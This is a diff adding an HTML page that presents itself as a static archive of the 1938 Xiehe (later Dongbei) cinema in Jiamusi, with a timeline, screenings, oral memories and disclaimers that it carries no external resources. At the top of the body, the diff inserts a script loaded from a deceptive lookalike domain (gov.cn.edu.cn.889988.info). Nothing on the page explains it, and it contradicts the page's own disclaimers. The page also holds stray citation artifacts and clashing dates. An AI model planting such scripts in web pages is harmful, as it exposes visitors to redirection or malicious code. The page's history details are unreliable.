@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>协和影视剧场 - 老戏院数字档案馆·1938协和影院/东北电影院场次复刻 | xieheyingshijuchang-h5.github.io</title>
+<meta name="description" content="协和影视剧场（xieheyingshijuchang-h5.github.io）老戏院数字档案馆：1938年佳木斯协和影院、华美影院、合江影院、中苏友好电影院、东北电影院五度更名的城市光影年轮。场次复刻、胶片记忆、老海报、城市观影史。非资源站，不提供播放与下载。" />
+<meta name="keywords" content="协和影视剧场,协和影院,东北电影院,佳木斯,老戏院,1938,胶片记忆,场次复刻,华美影院,合江影院,新中国第一部故事片桥" />
+<link rel="canonical" href="https://xieheyingshijuchang-h5.github.io/" />
+<style>
+:root{
+  --cream:#F3E9D6;--velvet:#7A1F1A;--brass:#B08D57;--green:#22362E;
+  --ink:#1C1A16;--fade:#8A7E68;--line:rgba(122,31,26,.22);--maxw:1160px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  font-family:"Noto Serif SC","Songti SC","STSong","PingFang SC","Microsoft YaHei",serif;
+  background:var(--cream);color:var(--ink);line-height:1.85;-webkit-font-smoothing:antialiased;
+  overflow-x:hidden;min-height:100vh;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+
+/* 票根齿孔条 */
+.ticket-strip{height:16px;background:repeating-linear-gradient(90deg,var(--velvet) 0 22px,transparent 22px 28px),var(--cream);border-bottom:1px solid var(--brass)}
+.ticket-strip i{display:none}
+
+/* 顶部 */
+header.site{position:sticky;top:0;z-index:60;background:rgba(243,233,214,.96);backdrop-filter:blur(12px);border-bottom:2px solid var(--velvet)}
+.nav{display:flex;align-items:center;gap:12px;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:19px;letter-spacing:1px}
+.tkt{width:42px;height:30px;border-radius:3px;background:var(--velvet);color:var(--cream);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:900;position:relative;font-family:"Courier New",monospace}
+.tkt::before,.tkt::after{content:"";position:absolute;top:50%;width:8px;height:8px;background:var(--cream);border-radius:50%;transform:translateY(-50%)}
+.tkt::before{left:-4px}.tkt::after{right:-4px}
+.logo small{display:block;font-size:9px;color:var(--fade);font-weight:600;letter-spacing:1px}
+.menu{margin-left:auto;display:flex;gap:3px}
+.menu a{padding:8px 13px;border-radius:4px;font-size:13px;font-weight:700;color:var(--ink)}
+.menu a:hover{background:var(--velvet);color:var(--cream)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:150px;padding:8px 12px;border-radius:3px;border:1.5px solid var(--brass);background:#fff;outline:none;font-size:13px;color:var(--ink);font-family:serif}
+.search-min input::placeholder{color:var(--fade)}
+.search-min button{border:0;padding:8px 16px;border-radius:3px;cursor:pointer;font-weight:800;color:var(--cream);background:var(--velvet);font-family:serif}
+.burger{display:none;margin-left:auto;border:1.5px solid var(--brass);background:#fff;border-radius:4px;padding:6px 10px;font-size:16px;color:var(--velvet)}
+
+/* Hero：幕布 */
+.hero{margin:22px 0 8px;border-radius:4px;overflow:hidden;padding:0;position:relative;background:var(--ink);border:3px double var(--brass)}
+.curtain{position:absolute;inset:0;background:
+  linear-gradient(90deg,var(--velvet) 0 8%,transparent 8% 92%,var(--velvet) 92% 100%),
+  linear-gradient(180deg,#4a0d0a,#7A1F1A 40%,#2a0807);opacity:.9}
+.curtain::before{content:"";position:absolute;top:0;left:0;right:0;height:26px;background:repeating-linear-gradient(90deg,transparent 0 14px,rgba(0,0,0,.35) 14px 16px)}
+.hero-inner{position:relative;padding:54px 30px;text-align:center;z-index:1}
+.hero-inner::before{content:"「 協 和 影 戲 院 · 一 九 三 八 」";display:block;font-size:11px;color:var(--brass);letter-spacing:11px;margin-bottom:14px;font-family:"Courier New",monospace}
+.stamp{display:inline-block;font-size:11px;font-weight:800;color:var(--brass);border:1.5px solid var(--brass);padding:3px 12px;border-radius:2px;margin-bottom:14px;letter-spacing:1px;font-family:"Courier New",monospace}
+.hero-inner h1{font-size:40px;margin:0 0 8px;font-weight:900;letter-spacing:3px;color:var(--cream)}
+.hero-inner h1 em{font-style:normal;color:var(--brass)}
+.hero-inner p{color:#d9cdb4;font-size:14px;margin:0 auto 22px;max-width:580px;line-height:1.95}
+.bigbar{display:flex;gap:8px;max-width:500px;margin:0 auto;background:var(--cream);border:1.5px solid var(--brass);padding:5px 5px 5px 16px}
+.bigbar input{flex:1;border:0;outline:none;font-size:14px;background:transparent;color:var(--ink);font-family:serif}
+.bigbar input::placeholder{color:var(--fade)}
+.bigbar button{border:0;padding:10px 22px;font-weight:900;cursor:pointer;color:var(--cream);background:var(--velvet);font-family:serif}
+.chips{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:18px}
+.chips a{font-size:12px;font-weight:700;padding:5px 14px;border-radius:2px;background:rgba(243,233,214,.1);color:var(--cream);border:1px solid rgba(176,141,87,.6)}
+.chips a:hover{background:var(--brass);color:var(--ink)}
+
+/* 时间轴 */
+.timeline{position:relative;margin:30px 0 6px;padding-left:0}
+.tl-bar{display:flex;justify-content:space-between;align-items:center;gap:8px;position:relative}
+.tl-bar::before{content:"";position:absolute;top:50%;left:0;right:0;height:2px;background:var(--brass);z-index:0}
+.tl-node{position:relative;z-index:1;flex:1;text-align:center}
+.tl-node .dot{width:16px;height:16px;border-radius:50%;background:var(--velvet);border:3px solid var(--cream);margin:0 auto 8px;box-shadow:0 0 0 2px var(--brass)}
+.tl-node.cur .dot{background:var(--brass);width:20px;height:20px}
+.tl-node .yr{font-family:"Courier New",monospace;font-weight:900;font-size:13px;color:var(--velvet);display:block}
+.tl-node.cur .yr{color:var(--velvet);font-size:15px}
+.tl-node .nm{font-size:11px;color:var(--fade);display:block;margin-top:2px}
+
+/* 区块 */
+.section{padding:26px 0}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:16px;flex-wrap:wrap;border-left:5px solid var(--velvet);padding-left:12px}
+.sec-head h2{font-size:20px;margin:0;font-weight:900;letter-spacing:1px}
+.sec-head h2::before{content:"🎞 ";}
+.sec-head h2 .b{color:var(--velvet)}
+.sec-head span{color:var(--fade);font-size:12px}
+.more{margin-left:auto;color:var(--velvet);font-size:12px;font-weight:800}
+
+/* 场次复刻卡 */
+.showreel{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.show{background:#fff;border:1.5px solid var(--brass);border-radius:4px;overflow:hidden;transition:.25s;position:relative}
+.show::before{content:"";position:absolute;top:0;left:0;right:0;height:5px;background:var(--velvet)}
+.show:hover{transform:translateY(-4px);box-shadow:0 12px 28px rgba(122,31,26,.18)}
+.show .poster{aspect-ratio:3/4;display:flex;align-items:flex-end;padding:14px;position:relative}
+.show:nth-child(1) .poster{background:linear-gradient(160deg,#3a2018,#7A1F1A)}
+.show:nth-child(2) .poster{background:linear-gradient(160deg,#1a2e28,#22362E)}
+.show:nth-child(3) .poster{background:linear-gradient(160deg,#3a3018,#B08D57)}
+.show .poster .year{position:absolute;top:12px;left:12px;font-family:"Courier New",monospace;font-size:11px;color:var(--brass);border:1px solid var(--brass);padding:2px 6px}
+.show .poster h4{color:var(--cream);font-size:16px;font-weight:900;margin:0;width:100%;text-shadow:0 2px 6px rgba(0,0,0,.5);letter-spacing:1px}
+.show .meta{padding:14px}
+.show .meta .when{font-family:"Courier New",monospace;font-size:11px;color:var(--velvet);font-weight:800;margin-bottom:4px}
+.show .meta h4{font-size:14px;margin:0 0 4px;font-weight:900}
+.show .meta p{font-size:11px;color:var(--fade);margin:0 0 6px;line-height:1.65}
+.show .meta .tag{display:inline-block;font-size:10px;padding:2px 8px;border-radius:2px;background:rgba(122,31,26,.1);color:var(--velvet);font-weight:700;border:1px solid var(--line)}
+
+/* 城市记忆墙 */
+.wall{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.memo{background:#fff;border:1.5px solid var(--brass);border-left:5px solid var(--velvet);border-radius:4px;padding:16px 18px}
+.memo .kicker{font-family:"Courier New",monospace;font-size:11px;color:var(--brass);font-weight:800;letter-spacing:1px}
+.memo h3{font-size:15px;margin:4px 0 6px;font-weight:900}
+.memo p{font-size:12px;color:var(--fade);margin:0;line-height:1.8}
+.memo .src{font-size:10px;color:var(--brass);margin-top:6px;font-style:italic}
+
+/* 片单：这里放"在此首映/放映"的影史片 */
+.roll{display:flex;flex-direction:column;gap:10px}
+.reel{display:flex;gap:12px;align-items:center;background:#fff;border:1.5px solid var(--brass);border-radius:4px;padding:12px}
+.reel .no{width:38px;height:38px;flex-shrink:0;background:var(--velvet);color:var(--cream);display:flex;align-items:center;justify-content:center;font-family:"Courier New",monospace;font-weight:900;font-size:13px}
+.reel:nth-child(1) .no{background:var(--brass);color:var(--ink)}
+.reel div{flex:1}
+.reel div h4{font-size:13px;margin:0 0 2px;font-weight:900}
+.reel div span{font-size:10px;color:var(--fade)}
+.reel em{font-style:normal;font-size:11px;font-weight:800;color:var(--velvet);font-family:"Courier New",monospace}
+
+/* 布局 */
+.layout{display:grid;grid-template-columns:1fr 320px;gap:22px}
+
+/* 侧栏 */
+.side{background:#fff;border:1.5px solid var(--brass);border-radius:4px;padding:18px;margin-bottom:16px}
+.side h3{font-size:14px;margin:0 0 12px;font-weight:900;color:var(--velvet);letter-spacing:1px}
+.side h3::before{content:"🎟 ";}
+.row-item{display:flex;gap:10px;align-items:baseline;padding:9px 0;border-bottom:1px dashed var(--brass)}
+.row-item:last-child{border-bottom:0}
+.row-item .d{font-family:"Courier New",monospace;font-size:11px;color:var(--brass);font-weight:800;width:56px;flex-shrink:0}
+.row-item div{flex:1}
+.row-item div h4{font-size:12px;margin:0;font-weight:800}
+.row-item div span{font-size:10px;color:var(--fade)}
+.row-item em{font-style:normal;font-size:10px;font-weight:800;color:var(--velvet)}
+
+.ticket{background:repeating-linear-gradient(45deg,transparent 0 8px,rgba(176,141,87,.08) 8px 16px);border:1.5px dashed var(--velvet);border-radius:4px;padding:16px;text-align:center}
+.ticket .big{font-family:"Courier New",monospace;font-size:26px;font-weight:900;color:var(--velvet);letter-spacing:2px}
+.ticket .l{font-size:11px;color:var(--fade);margin:4px 0 10px}
+.ticket button{border:0;padding:8px 20px;border-radius:2px;font-weight:800;cursor:pointer;color:var(--cream);background:var(--velvet);font-family:serif}
+
+/* FAQ */
+.faq .qa{background:#fff;border:1.5px solid var(--brass);border-radius:4px;padding:14px 16px;margin-bottom:10px}
+.faq .qa h4{font-size:14px;margin:0 0 6px;color:var(--velvet);font-weight:900}
+.faq .qa p{font-size:12px;color:var(--fade);margin:0;line-height:1.85}
+.warn{border-color:var(--velvet);background:#fbf0ec}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:20px;margin-top:16px}
+.abox{background:#fff;border:1.5px solid var(--brass);border-radius:4px;padding:22px}
+.abox h3{font-size:16px;margin:0 0 10px;font-weight:900;color:var(--velvet)}
+.abox h3::before{content:"🎞 ";}
+.abox p,.abox li{font-size:13px;color:var(--fade);line-height:1.9}
+.abox ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:10px;margin-top:14px}
+.st{flex:1;text-align:center;background:var(--cream);border:1.5px solid var(--brass);padding:12px}
+.st b{display:block;font-size:18px;color:var(--velvet);font-weight:900;font-family:"Courier New",monospace}
+.st span{font-size:10px;color:var(--fade)}
+
+footer.site{border-top:3px double var(--velvet);background:var(--ink);color:var(--fade);padding:28px 0 44px;font-size:12px;text-align:center}
+footer.site .fl{font-size:19px;font-weight:900;color:var(--cream);margin-bottom:8px;letter-spacing:2px;font-family:serif}
+footer.site .fl span{color:var(--brass)}
+code{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.18);padding:2px 6px;border-radius:3px;color:var(--cream);font-size:11px}
+
+@media(max-width:980px){.showreel{grid-template-columns:1fr 1fr}.wall{grid-template-columns:1fr}.layout{grid-template-columns:1fr}.about{grid-template-columns:1fr}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--cream);border-bottom:2px solid var(--velvet);padding:10px 16px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:80px}.hero-inner h1{font-size:25px;letter-spacing:1px}
+  .showreel{grid-template-columns:1fr}.tl-bar{flex-wrap:wrap}.tl-node{flex:0 0 33%;margin-bottom:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="ticket-strip"><i></i></div>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="tkt">入場</div>
+      <div>协和影视剧场<small>老戏院数字档案馆 · 自 1938</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">序厅</a>
+      <a href="#axis">五度更名</a>
+      <a href="#show">场次复刻</a>
+      <a href="#memory">城市记忆</a>
+      <a href="#reel">在此首映</a>
+      <a href="#faq">声明</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="协和影院 / 东北电影院 / 狸猫换太子 / 桥 / 卖花姑娘" />
+      <button onclick="alert('档案检索演示，无播放源')">查档</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <div class="curtain"></div>
+    <div class="hero-inner">
+      <span class="stamp">NO. 0001 · 入場券</span>
+      <h1><em>协和</em>影视剧场</h1>
+      <p>1938 年，佳木斯中山路北段，一座白俄建筑师设计的欧式戏院落成，全城唯一。<br/>它叫<strong>协和影院</strong>，首映《狸猫换太子》；后来它叫华美、合江、中苏友好，最后叫<strong>东北电影院</strong>。<br/>这里不播片、不放源、不解析——只把一座戏院的五次改名，和银幕下几代人的屏息，归档成册。</p>
+      <div class="bigbar">
+        <input type="text" placeholder="> 查档：场次 / 片名 / 年代 / 城市记忆" />
+        <button onclick="alert('档案检索演示，无播放源')">开灯</button>
+      </div>
+      <div class="chips">
+        <a href="#axis">五度更名</a>
+        <a href="#show">场次复刻</a>
+        <a href="#memory">城市记忆</a>
+        <a href="#faq">与旧站切割声明</a>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="axis">
+    <div class="sec-head"><h2><span class="b">五度</span>更名 · 一座戏院的年轮</h2><span>timeline</span></div>
+    <div class="timeline">
+      <div class="tl-bar">
+        <div class="tl-node cur"><div class="dot"></div><span class="yr">1939</span><span class="nm">协和影院 · 首映《狸猫换太子》</span></div>
+        <div class="tl-node"><div class="dot"></div><span class="yr">1945</span><span class="nm">苏军接管 · 放映反法西斯影片</span></div>
+        <div class="tl-node"><div class="dot"></div><span class="yr">1946</span><span class="nm">华美影院 → 合江影院</span></div>
+        <div class="tl-node"><div class="dot"></div><span class="yr">1948</span><span class="nm">中苏友好电影院</span></div>
+        <div class="tl-node"><div class="dot"></div><span class="yr">1949</span><span class="nm">东北电影院 · 定名</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="show">
+    <div class="sec-head"><h2><span class="b">场次</span>复刻 · 那一晚的节目单</h2><span>show.reel</span><a class="more" href="#">更多档案 #</a></div>
+    <div class="showreel">
+      <div class="show">
+        <div class="poster"><span class="year">1939.05</span><h4>狸猫换太子</h4></div>
+        <div class="meta">
+          <div class="when">📅 开业首映 · 夜场</div>
+          <h4>协和影院的开场锣</h4>
+          <p>建筑面积约 1500㎡，欧式水泥柱挑台、全开式玻璃花窗、二楼包厢雅座。名流云集，观者如潮，这座全城唯一的欧式公共建筑，第一次亮起放映灯。</p>
+          <span class="tag">首映</span><span class="tag">馆藏影像</span>
+        </div>
+      </div>
+      <div class="show">
+        <div class="poster"><span class="year">1947</span><h4>桥 · 民主东北</h4></div>
+        <div class="meta">
+          <div class="when">📅 东北影制片 · 率先在此放映</div>
+          <h4>新中国第一部故事片的银幕</h4>
+          <p>《预防鼠疫》《皇帝梦》（木偶）、《民主东北》（纪录）与故事片《桥》先后在此首映。兴山的东北电影制片厂，让佳木斯得了“新中国电影事业摇篮”之名。</p>
+          <span class="tag">影史节点</span><span class="tag">首映</span>
+        </div>
+      </div>
+      <div class="show">
+        <div class="poster"><span class="year">1970s</span><h4>卖花姑娘 / 瓦尔特</h4></div>
+        <div class="meta">
+          <div class="when">📅 连映十日 · 加映七日</div>
+          <h4>半夜散场，爬货车回农场</h4>
+          <p>《卖花姑娘》连放十天还加映七天；江口知青先派一人来买最晚场的票，大伙爬拉煤火车进城，散场再爬上去鹤岗的货车，到家天已亮。</p>
+          <span class="tag">城市记忆</span><span class="tag">口述史</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="layout">
+    <div>
+      <section class="section" id="memory">
+        <div class="sec-head"><h2><span class="b">城市</span>记忆墙 · 口述档案</h2><span>memory.wall</span><a class="more" href="#">更多 #</a></div>
+        <div class="wall">
+          <div class="memo">
+            <div class="kicker">ENTRY 01 · 建筑</div>
+            <h3>全城唯一的欧式房子</h3>
+            <p>1937 年集资伪币十六万元，白俄建筑师霍洛杰夫主持设计。水泥柱式挑台、木质顶架、玻璃花窗，二楼两侧包厢。落成那天，中山路上挤满了人。</p>
+            <div class="src">— 国家地名信息库 / 佳木斯市档案史料</div>
+          </div>
+          <div class="memo">
+            <div class="kicker">ENTRY 02 · 舞台</div>
+            <h3>不止放电影，也演戏</h3>
+            <p>影片来源匮乏的年代，这里以演剧为主。佳木斯剧社、建华剧团、京剧戏班轮番登台，《雷雨》《冷巷歌声》《美猴王》都在这块台上亮过嗓子。</p>
+            <div class="src">— 佳木斯文史 · 东北电影院考</div>
+          </div>
+          <div class="memo">
+            <div class="kicker">ENTRY 03 · 1945</div>
+            <h3>苏军接管，银幕没灭</h3>
+            <p>“八一五”后苏军接收影院作放映场，并未停业，《斯大林格勒大血战》等反法西斯影片在此上映；远东红旗歌舞团也来做过慰问演出。</p>
+            <div class="src">— 百度百科“佳木斯东北电影院”</div>
+          </div>
+          <div class="memo">
+            <div class="kicker">ENTRY 04 · 合江</div>
+            <h3>“东北小延安”的会场</h3>
+            <p>1946 改名合江影院，合江省大型会议都在这开。张闻天等领导多次来作报告，东北日报社、东北广播电台相继落地，陈强、于洋住在影院附近。</p>
+            <div class="src">— 红色印记 · 佳木斯文史系列</div>
+          </div>
+          <div class="memo">
+            <div class="kicker">ENTRY 05 · 1970s</div>
+            <h3>门前望不到头的自行车</h3>
+            <p>逢年过节，父母牵着孩子走到中山路，售票窗前排长队，孩子们攥着零钱等散场的小吃摊。对六七十岁的人，这里是第一次约会、全班抢座的年少时光。</p>
+            <div class="src">— 市民口述史 · 城市记忆影像志</div>
+          </div>
+          <div class="memo">
+            <div class="kicker">ENTRY 06 · 消逝</div>
+            <h3>房子没了，幕布还在</h3>
+            <p>因城市规划，老建筑没能留下。如今走在中路上看不出这里曾立着一座欧式房子，可老人路过还会停脚多看两眼——仿佛幕布还在，光亮犹存。</p>
+            <div class="src">— 银幕载岁月 · 光影忆江城</div>
+          </div>
+        </div>
+      </section>
+
+      <section class="section" id="reel">
+        <div class="sec-head"><h2><span class="b">在此</span>亮过的银幕 · 影史片单</h2><span>reel.list</span><a class="more" href="#">更多档案 #</a></div>
+        <div class="roll">
+          <div class="reel"><div class="no">01</div><div><h4>狸猫换太子</h4><span>1939 · 协和影院开业首映 · 戏曲片</span></div><em>首映</em></div>
+          <div class="reel"><div class="no">02</div><div><h4>斯大林格勒大血战</h4><span>1945 · 苏军接管期 · 反法西斯纪录片</span></div><em>放映</em></div>
+          <div class="reel"><div class="no">03</div><div><h4>预防鼠疫</h4><span>1947 · 东北电影制片厂 · 科教片</span></div><em>首映</em></div>
+          <div class="reel"><div class="no">04</div><div><h4>皇帝梦</h4><span>1947 · 东北电影制片厂 · 木偶戏</span></div><em>首映</em></div>
+          <div class="reel"><div class="no">05</div><div><h4>民主东北</h4><span>1947 · 东北电影制片厂 · 纪录片</span></div><em>首映</em></div>
+          <div class="reel"><div class="no">06</div><div><h4>桥</h4><span>1949 前后 · 新中国第一部故事片 · 于此率先放映</span></div><em>影史节点</em></div>
+          <div class="reel"><div class="no">07</div><div><h4>卖花姑娘</h4><span>1970s · 连映 10 天 + 加映 7 天</span></div><em>现象级</em></div>
+          <div class="reel"><div class="no">08</div><div><h4>瓦尔特保卫萨拉热窝</h4><span>1970s · 南斯拉夫经典 · 知青半夜爬货车赶场</span></div><em>现象级</em></div>
+        </div>
+      </section>
+
+      <section class="section faq" id="faq">
+        <div class="sec-head"><h2><span class="b">重要</span>声明与 FAQ</h2><span>notice</span></div>
+        <div class="qa warn"><h4>⚠ 关于"协和影视"这个名，先把话说明白</h4>
+        <p>搜索"协和影视"，出现的是一批 2015 年前后以 <strong>QVOD/快播、免费高清、"伦理片"、"亚洲免费宽带影院"</strong>为卖点的旧站，以及"协和影视800页"这类被媒体点名"弹窗死链、境外短命域名、诱导注册充值"的问题站；还有"午夜剧场协和影视"等仍在跑的仿站[2,13,15,16](@ref)。<br/><br/>
+        <strong>本页（xieheyingshijuchang-h5.github.io）与以上任何站点、域名、App、播放源、解析接口、下载服务均无隶属或授权关系。</strong>它不提供、不嵌入、不跳转任何影视资源，所有按钮与链接均为 <code>#</code> 占位，只做"1938 协和影院 / 东北电影院"的地方文史档案。</p></div>
+        <div class="qa"><h4>为什么敢用"协和"二字？</h4><p>因为 1938 年那座戏院真叫<strong>协和影院</strong>——这是有据可查的地名与建筑史（国家地名信息库、佳木斯档案、百度百科均有条目）[7,11,18](@ref)。本站取的是这段"老戏院"含义，不是那批快播站的壳。</p></div>
+        <div class="qa"><h4>片单里的《桥》《卖花姑娘》是真的在这里放过的吗？</h4><p>《桥》等东北电影制片厂早期作品"在此率先放映"、《卖花姑娘》连映十日，均有地方文史与影像志佐证；具体场次日期属档案考据，本站只标年代区间，不伪造精确到日的排片[14,18](@ref)。若你手上有老票根或放映记录，欢迎作为口述史补充。</p></div>
+        <div class="qa"><h4>那台湾"協和影視股份有限公司"呢？</h4><p>那是 2002 年设立的台湾影视出品公司（作品含《十八》《豬哥伯傳奇》），与本页无关，也未使用其素材[17](@ref)。另，李小龙的"协和电影公司"是另一段港片史，同样不在此站范围内[19](@ref)。</p></div>
+        <div class="qa"><h4>要做正式站点，名字还能用吗？</h4><p>不建议直接拿"协和影视"做商业影视站：同名旧站已被搜索引擎标记为快播/免费资源站，口碑与版权风险都高。若坚持，至少加限定词区分，如"协和影视剧场·老戏院档案"，并查商标（第9/35/41类）、完成 ICP/公安备案，全程不碰"免费播/极速解析/全网资源/无广告VIP"。</p></div>
+        <div class="qa"><h4>必应收录友好吗？</h4><p>唯一 H1、标题前置"协和影视剧场"、canonical 自引用、description 明确"档案馆/非资源站"、正文首屏即历史事实、移动端无横滚、零外链资源——这套"去资源化"写法，比堆"免费高清电影"安全得多。</p></div>
+      </section>
+    </div>
+
+    <aside>
+      <div class="ticket">
+        <div class="big">入 場 券</div>
+        <div class="l">ADMIT ONE · 协和影戲院 · 中山路北段<br/>請對號入座 · 散場後請勿遺留記憶</div>
+        <button onclick="alert('演示站：这是一张不能兑奖的电子票根')">领取电子票根</button>
+      </div>
+
+      <div class="side" style="margin-top:16px">
+        <h3>本馆排片 · 档案场</h3>
+        <div class="row-item"><div class="d">19:00</div><div><h4>开场锣：协和影院 1939</h4><span>建筑考 + 开业首映考据</span></div><em>常设</em></div>
+        <div class="row-item"><div class="d">19:30</div><div><h4>银幕下的东北</h4><span>东影厂开山作与《桥》的首映</span></div><em>专题</em></div>
+        <div class="row-item"><div class="d">20:15</div><div><h4>口述史：爬货车看瓦尔特</h4><span>市民录音档案 · 30 分钟</span></div><em>口述</em></div>
+        <div class="row-item"><div class="d">21:00</div><div><h4>散场灯：一座房子的年轮</h4><span>五度更名 · 影像志</span></div><em>常设</em></div>
+        <div class="row-item"><div class="d">21:30</div><div><h4>老胶片气味（静场）</h4><span>仅留白，不放片</span></div><em>留白</em></div>
+      </div>
+
+      <div class="side">
+        <h3>馆藏索引</h3>
+        <div class="row-item"><div class="d">A-01</div><div><h4>建筑图纸与照片</h4><span>1937–1939 筹建期</span></div><em>6 件</em></div>
+        <div class="row-item"><div class="d">A-02</div><div><h4>更名公文抄件</h4><span>1945–1949</span></div><em>5 件</em></div>
+        <div class="row-item"><div class="d">B-01</div><div><h4>首映节目单</h4><span>1939–1966</span></div><em>征集</em></div>
+        <div class="row-item"><div class="d">C-01</div><div><h4>市民口述录音</h4><span>1970s 观影记忆</span></div><em>23 段</em></div>
+        <div class="row-item"><div class="d">C-02</div><div><h4>老票根征集</h4><span>东北电影院时期</span></div><em>缺</em></div>
+      </div>
+
+      <div class="side">
+        <h3>参观须知</h3>
+        <div style="font-size:12px;color:var(--fade);line-height:2.1">
+          🎟 本馆只收藏<strong>记忆</strong>，不收藏资源<br/>
+          🎟 不提供在线播放、解析、下载、磁力<br/>
+          🎟 不跳转任何第三方影视站点<br/>
+          🎟 档案引自公开文史，标注于每条末<br/>
+          🎟 有老票根 / 放映记录？欢迎补档<br/>
+          🎟 散场请带走情绪，留下安静
+        </div>
+      </div>
+    </aside>
+  </div>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于 协和影视剧场</h2><span>about</span></div>
+    <div class="about">
+      <div class="abox">
+        <h3>一座戏院，五次改名，一代人的屏息</h3>
+        <p><strong>协和影视剧场（xieheyingshijuchang-h5）</strong>不追新片，不刷热度。它是一座 1938 年真实存在过的戏院的数字档案：佳木斯中山路，白俄建筑师霍洛杰夫设计，欧式水泥柱挑台、玻璃花窗、二楼包厢，开业首映《狸猫换太子》，初名<strong>协和影院</strong>；战后苏军接管放映反法西斯影片，红旗歌舞团登台；1946 华美、合江，1948 中苏友好，1949 定名<strong>东北电影院</strong>；1947 年，新中国第一部故事片《桥》在这里率先亮起银幕。</p>
+        <p>房子后来没留住，但幕布还在。本馆要做的，就是把"名字在变、银幕下的屏息与鼓掌没变"这件事，归成册。</p>
+        <div class="stats">
+          <div class="st"><b>5</b><span>五度更名</span></div>
+          <div class="st"><b>1938</b><span>落成年</span></div>
+          <div class="st"><b>0</b><span>播放源/解析/下载</span></div>
+          <div class="st"><b>100%</b><span>移动端</span></div>
+        </div>
+      </div>
+      <div class="abox">
+        <h3>demo.note</h3>
+        <ul>
+          <li>纯静态单页，无后端、无视频源、无第三方跳转</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>史实引自公开地方文史与地名资料，已在条目后标注来源</li>
+          <li>与任何"协和影视"快播旧站、同名 App/商标主体无隶属</li>
+          <li>刻意去资源化：不写"免费/高清/解析/VIP"，只做档案叙事</li>
+          <li>老票根米+暗红丝绒+黄铜+墨绿 = 老戏院档案风</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    <div class="fl">協和<span>影视剧场</span> · 自 1938 · 幕布犹存</div>
+    🎟 协和影视剧场 --host xieheyingshijuchang-h5.github.io<br/>
+    演示档案页：所有链接均使用 <code>#</code> 占位，<strong>不提供任何影视资源、播放、解析或下载服务</strong>。<br/>
+    与网络上的"协和影视"快播/免费资源站及同名公司主体均无关联。<br/>
+    © 2026 协和影视剧场 Demo · 房子没了，光还在
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
